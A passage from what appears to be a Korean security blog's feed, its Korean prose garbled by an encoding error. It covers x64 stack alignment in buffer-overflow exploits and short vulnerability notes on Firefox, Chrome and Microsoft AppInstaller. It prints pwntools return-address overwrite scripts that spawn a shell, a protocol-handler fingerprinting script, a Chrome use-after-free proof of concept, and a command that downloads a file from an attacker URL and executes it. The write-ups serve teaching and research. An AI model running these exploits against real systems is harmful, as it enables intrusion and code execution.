18.04ë¶€í„´ ì‘ë™ ì•ˆ í•˜ëŠ” ê±´ë°? ì´ê±°ë¥¼ ì´í•´í•˜ë ¤ë©´ ìš°ì„  control intsructionë“¤ì˜ ì°¨ì´ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ìƒê°ë³´ë‹¤ ëª¨ë¥´ëŠ” ì‚¬ëŒì´ ë§ë”ë¼ê³ â€¦ ê° ì¸ìŠ¤íŠ¸ëŸ­ì…˜ë§ˆë‹¤ ìŠ¤íƒì˜ ë³€í™”, ë” ìì„¸íˆ ë§í•˜ìë©´ RSPì˜ ë³€í™”ê°€ ì–´ë–¤ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>ë‹¨ìˆœíˆ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì˜®ê¹€. ì¸ìš©êµ¬ë¥¼ ë³´ë©´ ì•Œê² ì§€ë§Œ ë¦¬í„´ ì •ë³´ë¥¼ ì €ì¥í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. jmp ì¸ìŠ¤íŠ¸ëŸ­ì…˜ìœ¼ë¡œ ì¸í•œ ìŠ¤íƒì˜ ë³€í™”ëŠ” ì—†ë‹¤ê³  ìƒê°í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>ë°˜ë©´ call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì˜®ê¸°ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ subroutineì— ì ì‹œ ë“¤ë €ë‹¤ê°€ ëŒì•„ì˜¤ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— ë¦¬í„´ ì •ë³´ë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ê·¸ ë¦¬í„´ ì •ë³´ëŠ” stackì— push í•˜ê¸° ë•Œë¬¸ì— call ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‹¤í–‰í•œ ë’¤ì—” RSPì˜ ê°’ì´ 8ë§Œí¼ ê°ì†Œí•©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì‹¤í–‰ë˜ë©´ &lt;main+18&gt;ì„ stackì— push í•˜ê² ì£ ?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>ë”°ë¼ì„œ ì •ìƒì ìœ¼ë¡œ í˜¸ì¶œëœ í•¨ìˆ˜ì˜ entry pointì—ì„  RSP+8ì´ 16ì˜ ë°°ìˆ˜ê°€ ë˜ëŠ” ê²ë‹ˆë‹¤. ì—¬ê¸°ì„œ ê¼­ ê¸°ì–µí•˜ì…”ì•¼ í•  ê²ƒì´ Callì„ ì‹¤í–‰í•œ ì§í›„ì—” ì¼ì‹œì ìœ¼ë¡œ stack alignì´ ê¹¨ì§„ë‹¤ëŠ” ê²ë‹ˆë‹¤.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>callì„ ì„¤ëª…í•  ë•Œ sub routineì— ì ì‹œ ë“¤ë €ë‹¤ ëŒì•„ê°„ë‹¤ê³  í–ˆìŠµë‹ˆë‹¤. ë¬¼ë¡  ì´ ëª¨ë“  ë™ì‘ì„ callì´ ë‹¤ í•˜ì§„ ì•Šê³ , ì›ë˜ì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ë‹¤ì‹œ ëŒì•„ê°€ëŠ” ë™ì‘ì€  retì´ ëŒ€ì‹ í•´ì¤ë‹ˆë‹¤.</p><p>retì€ ë‘ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ í•˜ë‚˜ë¡œ í•©ì³ ë†¨ë‹¤ê³  ìƒê°í•˜ì‹œë©´ ë˜ëŠ”ë°, callì´ ì €ì¥í•´ë†“ì€ ë¦¬í„´ ì •ë³´ë¥¼ ìŠ¤íƒì—ì„œ ë¹¼ë‚´ì–´ jmp í•©ë‹ˆë‹¤. ì¦‰, RSPê°’ì´ 8ë§Œí¼ ì¦ê°€í•œë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤.</p><p>!<img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>ìœ„ ìŠ¤í¬ë¦°ìƒ·ì€ retì„ ì‹¤í–‰í•˜ê¸° ì§ì „ì˜ ìƒí™©ì…ë‹ˆë‹¤. RSP ê°’ì„ ë³´ë©´ ì•„ì‹œê² ì§€ë§Œ retì„ ì‹¤í–‰í•˜ê¸° ì§ì „ì—” stack alignì´ ê¹¨ì ¸ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í•¨ìˆ˜ ì—í•„ë¡œê·¸ì˜ leave ëª…ë ¹ì–´ í˜¹ì€ pop rbpì˜ ê²°ê³¼ê² ì£ ?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>ê·¸ë¦¬ê³  retì„ ì‹¤í–‰í•˜ë©´ RSPê°€ 8ë§Œí¼ ì¦ê°€í•˜ê³  stack alignì´ ë‹¤ì‹œ ë§ì¶°ì§‘ë‹ˆë‹¤.</p><h2 id="ì •ë¦¬"><a href="#ì •ë¦¬" class="headerlink" title="ì •ë¦¬"></a>ì •ë¦¬</h2><ul><li>call : RSP-=8 â†’ ì¼ì‹œì ìœ¼ë¡œ stack alignì„ ê¹¸</li><li>ret : RSP+=8 â†’ leave ëª…ë ¹ì–´ë¡œ ê¹¨ì§„ stack alignì„ ë‹¤ì‹œ ë§ì¶¤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>ì ì´ì¯¤ ë˜ë©´ ëŒ€ì¶© ëˆˆì¹˜ì±„ì…¨ì„ ê±° ê°™ì€ë°, BOFê³µê²©ì„ í•  ë•Œ retìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì£ ? shellcodeë¥¼ ì‹¤í–‰í•˜ëŠ” ê±´ ë…¼ì™¸ë¡œ ì¹˜ê³ , ret2libc( RTL )ë‚˜ ROPë¡œ BOF exploitì„ í•˜ê²Œ ë  í…ë° callì´ ì•„ë‹ˆë¼ retìœ¼ë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ë•Œë¬¸ì— stack alignmentê°€ ê¹¨ì§€ê²Œ ë˜ëŠ” ê²ë‹ˆë‹¤.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>ì •ë§ ê°„ë‹¨í•œ BOF ì˜ˆì œë¡œ í™•ì¸í•´ë³´ì£ . vuln.cë¥¼ ì‘ì„±í•˜ê³  ì»´íŒŒì¼í•´ì¤ì‹œë‹¤. BOFë¥¼ í•  ê±°ë‹ˆê¹Œ ë‹¹ì—°íˆ stack canaryëŠ” í•´ì œí•´ì£¼ì„¸ìš”.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>ì˜ return ì£¼ì†Œë¥¼ <code>win()</code> í•¨ìˆ˜ì˜ entry pointë¡œ ë®ì–´ì“°ëŠ” ê³µê²© ì½”ë“œì…ë‹ˆë‹¤.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>ì˜ retì— break pointë¥¼ ê±¸ê³  <code>win()</code> í•¨ìˆ˜ê°€ í˜¸ì¶œëœ í›„ì˜ stack ìƒí™©ì„ ë´…ì‹œë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>retìœ¼ë¡œ í•¨ìˆ˜ <code>win()</code>ì˜ entry pointì— ë„ë‹¬í•˜ë©´</p><p>í”„ë¡¤ë¡œê·¸ë¥¼ ì‹¤í–‰í•˜ê³  ë‚˜ë©´ stack alignmentê°€ ê¹¨ì§€ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>ì»´í“¨í„°ëŠ” stackì´ í•­ìƒ align ë¼ìˆë‹¤ê³  ê°€ì •í•˜ê³  ê·¸ ìƒíƒœë¥¼ ìœ ì§€í•˜ë ¤ê³  í•©ë‹ˆë‹¤. ì¦‰, <code>win()</code>ì—ì„œ ê¹¨ì ¸ë²„ë¦° alignmentë¥¼ ê¹¨ì§„ ìƒíƒœë¡œ ìœ ì§€í•˜ê²Œ ë˜ê³ , <code>win()</code> ì´í›„ì— í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë“¤ì˜ stack alignmentëŠ” ê¹¨ì§„ ìƒíƒœê°€ ë©ë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>ê·¸ë¦¬ê³  ê²°êµ­ <code>do_system()</code>ì„ ì‹¤í–‰í•˜ë‹¤ movapsì— ê±¸ë ¤ segmentation faultë¥¼ ë„ìš°ê³  exploitì€ ì‹¤íŒ¨í•˜ê²Œ ë©ë‹ˆë‹¤.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>ì§€ê¸ˆê¹Œì§€ ì„¤ëª…í•œ ë‚´ìš©ì„ ì´í•´í•˜ì…¨ë‹¤ë©´ ì•ìœ¼ë¡œ ê³µê²© ì½”ë“œë¥¼ ì§œì‹¤ ë•Œ ì•„ë¬´ ë¬¸ì œì—†ì„ ê±°ë¼ ìƒê°í•©ë‹ˆë‹¤. ê·¸ë˜ë„ ì—¬ê¸°ì„œ ê¸€ì„ ë§ˆë¬´ë¦¬ ì§“ê¸´ ì• ë§¤í•˜ë‹ˆ í•´ê²° ë°©ë²•ì„ ì•Œì•„ë³´ì£ .</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>ë„¤. ì •ë§ ë³„ê±° ì—†ìŠµë‹ˆë‹¤. ret ê°€ì ¯ì„ í•˜ë‚˜ ë” ì¶”ê°€í•´ì„œ RSPì˜ ìœ„ì¹˜ë¥¼ 8ë§Œí¼ ì¡°ì •í•´ì£¼ë©´ BOF ê³µê²©ì„ í•  ë•Œ stack alignmentë¥¼ ìœ ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë„ˆë¬´ ë‹¨ìˆœí•˜ê³  ë‹¹ì—°í•´ì„œ ë” ì„¤ëª…í•  ê²Œ ì—†ë„¤ìš”.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>ì§ !</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p>RET sled ë§ê³ ë„ stack alignmentë¥¼ ìœ ì§€í•˜ë©´ì„œ ROP í•˜ëŠ” ë°©ë²•ì€ ë§ìŠµë‹ˆë‹¤. ì‚¬ì‹¤ í•œ ê°€ì§€ ë°©ë²• ë” ë³´ì—¬ë“œë¦¬ë ¤ê³  í–ˆëŠ”ë° ê·¸ê±´ endbr64ë‘ CETê¹Œì§€ ì„¤ëª…í•´ì•¼ ë¼ì„œ ê¸°íšŒê°€ ë˜ë©´ ë”°ë¡œ ê¸€ì„ ì‘ì„±í•˜ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>bof</tag>
      
      <tag>pwnable</tag>
      
      <tag>stack alignment</tag>
      
      <tag>rtl</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15680 : protocol handler infomation disclosure</title>
    <link href="/2020/12/05/fabu1ous/2020-12-05/"/>
    <url>/2020/12/05/fabu1ous/2020-12-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefoxì—ì„œ Protocol Handlerë¥¼ ì´ìš©í•œ Information Disclosure ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Protocol HandlerëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì´ ìì‹ ì˜ URI schemeë¥¼ ë“±ë¡í•  ìˆ˜ ìˆëŠ” ë§¤ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì´ë¥¼ í†µí•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¸Œë¼ìš°ì €ê°€ Protocol Handler URIë¥¼ ì‚¬ìš©í•´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰í•˜ë©´ â€œì›¹ì‚¬ì´íŠ¸ì—ì„œ ì´ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì—´ë ¤ê³  í•©ë‹ˆë‹¤.â€ë¼ëŠ” ì•Œë¦¼ì´ ëœ¹ë‹ˆë‹¤.  </p><p>Firefoxê°€ ì´ë¯¸ì§€ íƒœê·¸ì˜ ì†ŒìŠ¤ë¥¼ ë Œë”ë§ í•  ë•Œ, Protocol Handlerì˜ ì¡´ì¬ ì—¬ë¶€ì— ë”°ë¼ ë Œë”ë§ ê²°ê³¼ê°€ ë‹¤ë¦…ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ì ì„ ì•…ìš©í•´ ì›ê²©ìœ¼ë¡œ victimì— ì„¤ì¹˜ëœ í”„ë¡œê·¸ë¨ ë¦¬ìŠ¤íŠ¸ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;ì¡´ì¬í•˜ëŠ”ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victimì— ì¡´ì¬í•˜ëŠ” Protocol Handlerë¥¼ ì´ë¯¸ì§€ srcì— ë„£ìœ¼ë©´ broken imageì— ëŒ€í•œ ê¸°ë³¸ ì„¤ì •ì— ë”°ë¼ Elementì˜ sizeê°€ 24x24ë¡œ ë Œë”ë§ ë©ë‹ˆë‹¤.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;ì¡´ì¬í•˜ì§€ì•ŠëŠ”ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>ë°˜ë©´, ì¡´ì¬í•˜ì§€ ì•ŠëŠ” Protocol Handlerë¥¼ ì´ë¯¸ì§€ srcì— ë„£ìœ¼ë©´ Elementì˜ sizeëŠ” 0x0ìœ¼ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ í•´ì»¤ëŠ” ê°„ë‹¨í•œ JS scriptë¡œ Elementì˜ widthë¥¼ ê²€ì‚¬í•´ Protocol Handlerì˜ ì¡´ì¬ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” brute force ê³µê²©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>information disclosure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Chrome UAF in StopProfiler</title>
    <link href="/2020/12/04/l0ch/2020-12-04/"/>
    <url>/2020/12/04/l0ch/2020-12-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU ë“±ì˜ ë¦¬ì†ŒìŠ¤ ì‚¬ìš©ëŸ‰ì„ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆëŠ” <code>profiler</code> ê°ì²´ì—ì„œ ë¹„ë™ê¸° ì²˜ë¦¬ í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•œ UAF ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ POCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> í•¨ìˆ˜ì˜ resolveëŠ” ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ë¹„ë™ê¸° í•¨ìˆ˜ë¡œ ì„ ì–¸í•œ <code>main</code> í•¨ìˆ˜ì—ì„œ <code>await</code> í‚¤ì›Œë“œë¡œ <code>performance.profile</code> ê°ì²´ë¥¼ ì„ ì–¸í•˜ê³  <code>Object.prototype.__defineGetter__</code> ì˜ ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ì™€ mainì—ì„œ <code>stop</code> ì„ ë‘ ë²ˆ í˜¸ì¶œí•˜ê²Œ ë˜ë©´  <code>CpuProfile</code> ê°ì²´ê°€ ì‚­ì œë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ <code>CpuProfile</code> ì—ì„œ UAF ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ëŠ” ê°„ë‹¨í•˜ì§€ë§Œ ë†’ì€ ì‹¬ê°ì„±ì˜ UAF ì·¨ì•½ì ìœ¼ë¡œ, Googleì€ <code>Profiler::stop</code> ì—ì„œ ë™ê¸° ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì„ ë°©ì§€í•˜ë„ë¡ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>L0ch</tag>
      
      <tag>chrome</tag>
      
      <tag>javascript</tag>
      
      <tag>uaf</tag>
      
      <tag>asynchronous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft AppInstaller.exe Arbitrary File Download</title>
    <link href="/2020/12/03/idioth/2020-12-03/"/>
    <url>/2020/12/03/idioth/2020-12-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installerì—ì„œ arbitrary file downloadë¥¼ í•˜ì—¬ lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)ìœ¼ë¡œ í™œìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì›¹ ì„œë²„ì—ì„œ ì•± íŒ¨í‚¤ì§€ë¥¼ ë‹¤ìš´ë¡œë“œí•  ë•Œ ê³¼ì •ì„ ê°„ì†Œí™”í•˜ì—¬ íš¨ìœ¨ì ìœ¼ë¡œ í•˜ê¸° ìœ„í•´ ì›¹ ì„œë²„ì—ì„œ ì§ì ‘ ì•±ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì›¹ í˜ì´ì§€ì—ì„œ ì•± íŒ¨í‚¤ì§€ë¥¼ í˜¸ìŠ¤íŒ… í•˜ê¸° ìœ„í•´ì„œ <code>ms-appinstaller:?source=</code> URIë¥¼ ì‚¬ìš©í•˜ì—¬ <code>source=</code>ì— ëª…ì‹œëœ ì£¼ì†Œì— ìˆëŠ” íŒŒì¼ì— ëŒ€í•œ ì•± ë‹¤ìš´ë¡œë“œë¥¼ ì§„í–‰í•©ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ì—¬ í•´ì»¤ëŠ” ìì‹ ì˜ ì•…ì„± íŒŒì¼ì„ sourceì— ì‘ì„±í•˜ì—¬ arbitrary file downloadì„ ì§„í–‰í•  ìˆ˜ ìˆê³  <code>forfiles</code> ëª…ë ¹ì–´ë¥¼ í†µí•´ ì•± íŒ¨í‚¤ì§€ ë‹¤ìš´ë¡œë“œê°€ ì§„í–‰ëœ ê²½ë¡œì—ì„œ íŒŒì¼ì„ ì¡°ê±´ë¬¸ ë“±ìœ¼ë¡œ ê²€ìƒ‰í•˜ì—¬ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>appinstaller</tag>
      
      <tag>arbitrary file download</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-14418 : madCodeHook library LPE</title>
    <link href="/2020/12/02/fabu1ous/2020-12-02/"/>
    <url>/2020/12/02/fabu1ous/2020-12-02/</url>
    
